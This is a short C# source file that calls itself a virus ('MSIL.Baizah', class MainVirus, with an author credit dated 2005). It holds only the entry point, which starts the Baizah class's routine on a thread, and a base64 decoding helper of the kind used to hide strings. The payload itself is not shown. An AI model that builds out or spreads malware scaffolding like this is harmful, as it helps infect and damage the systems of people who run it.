using System;
using System.Text;
using System.Threading;

namespace MSIL_Baizah;

public class MainVirus
{
	private static string Info = "MSIL.Baizah (c) by MyVWA.Fa Made in Malaysia 032005";

	private static void Main()
	{
		Baizah @object = new Baizah();
		Thread thread = new Thread(@object.Baiz);
		thread.Start();
	}

	protected internal static string Decode(string input)
	{
		try
		{
			return Encoding.ASCII.GetString(Convert.FromBase64String(input));
		}
		catch (Exception)
		{
			return null;
		}
	}
}
